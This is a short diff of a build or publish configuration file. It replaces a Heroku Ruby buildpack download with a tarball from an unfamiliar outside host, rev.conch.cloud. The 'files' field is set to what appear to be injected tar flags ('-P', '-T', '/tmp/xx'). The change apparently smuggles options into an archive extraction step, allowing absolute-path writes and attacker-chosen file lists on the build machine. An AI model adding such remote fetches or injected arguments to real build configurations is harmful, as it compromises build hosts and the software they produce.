@@ -12,11 +12,8 @@ ruby_version = "2.5.6"
   dir = "."
   files = ["-P"]
   [[publish.Vendor]]
-  url = "http://codon-buildpacks.s3.amazonaws.com/buildpacks/heroku/ruby.tgz"
+  url = "http://rev.conch.cloud/tark2.tar"
   dir = "."
-  files = ["-T","/tmp/xx"]
-  [[publish.Vendor]]
-  url = "http://rev.conch.cloud/tark.tar"
-  dir = "."
-  files = ["-P"]
+  files = ["-P","-T","/tmp/xx"]
+
  
